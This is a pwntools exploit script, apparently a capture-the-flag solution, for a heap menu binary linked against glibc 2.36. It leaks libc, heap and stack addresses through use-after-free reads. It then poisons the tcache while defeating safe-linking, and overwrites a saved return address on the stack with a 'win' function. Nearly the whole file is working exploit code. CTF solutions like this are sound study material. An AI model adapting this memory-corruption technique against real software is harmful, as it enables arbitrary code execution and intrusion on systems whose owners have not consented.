#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
libc = ELF("./libc-2.36.so.6")
ld = ELF("./ld-2.36.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-f', '-h']

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def conn():
    # r = process([exe.path])
    # r = remote('gold.b01le.rs', 4002)
    r = remote('localhost', 4401)
    return r

def main():
    r = conn()
    def alloc(idx,sz):
        r.recvuntil(b'-----Resize----')
        r.sendline(b'1')
        r.recvuntil(b'Where? ')
        r.sendline(str(idx).encode())
        r.recvuntil(b'size? ')
        r.sendline(str(sz).encode())
    def free(idx):
        r.recvuntil(b'-----Resize----')
        r.sendline(b'2')
        r.recvuntil(b'Where? ')
        r.sendline(str(idx).encode())
    def view(idx):
        r.recvuntil(b'-----Resize----')
        r.sendline(b'3')
        r.recvuntil(b'Where? ')
        r.sendline(str(idx).encode())
        return r.recvline()
    def edit(idx, dat):
        r.recvuntil(b'-----Resize----')
        r.sendline(b'4')
        r.recvuntil(b'Where? ')
        r.sendline(str(idx).encode())
        r.recvline()
        r.sendline(dat)
    def exit():
        r.recvuntil(b'-----Resize----')
        r.sendline(b'5')
    def resize(idx, sz):
        r.recvuntil(b'-----Resize----')
        r.sendline(b'1')
        r.recvuntil(b'Where? ')
        r.sendline(str(idx).encode())
        r.recvuntil(b'size? ')
        r.sendline(str(sz).encode())
    
    def leak():
        r.recvuntil(b'-----Resize----\n')
        r.sendline(b'7')
        x = r.recvline()
        print(x)
        addr = int(x.split(b' ')[1].strip(),16)
        return addr
    
    
    # gdb.attach(r)
    win = leak()

    alloc(0,3000)
    alloc(1,3000)
    free(0)
    libcaddr = view(0).strip()
    libcaddr = int(libcaddr[5::-1].hex(), 16)
    print(hex(libcaddr))
    base = libcaddr - (0x7ffff7fb2cc0-0x7ffff7de1000)
    libc.address = base
    print(hex(base))
    alloc(0,3000)
    alloc(2,3000)
    alloc(3,3000)
    free(0)
    free(2)

    dat = view(2).strip()
    dat = int(dat[5::-1].hex(), 16)
    print(hex(dat))
    heap_base = dat - (0x55555555c290-0x55555555c000)
    print(hex(heap_base))
    free(1)
    free(3)
    alloc(0,128)
    alloc(1,128)
    free(0)
    free(1)
    addr1 = heap_base + (0x55d969d0d320 - 0x55d969d0d000)
    edit(1,p64(libc.symbols['environ'] ^ addr1 >> 12))
    # edit(1,p64(libc.symbols['environ']))
    alloc(0,128)
    alloc(1,128)
    dat = view(1).strip()
    stack_leak = int(dat[5::-1].hex(), 16)

    offset = (0x7fff16eb0df8 - 0x7fff16eb0ca8)

    print(hex(stack_leak))
    alloc(0, 256)
    alloc(1, 256)
    # alloc(2,256)
    free(0)
    free(1)
    addr2 = heap_base + (0x557670f7a4c0 -  0x557670f7a000)
    edit(1,p64((stack_leak - offset-(8+16)) ^ addr2 >> 12) )
    alloc(0,256)
    # pause()
    alloc(1,256)
    
    edit(1, b'A'*24 + p64(win))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
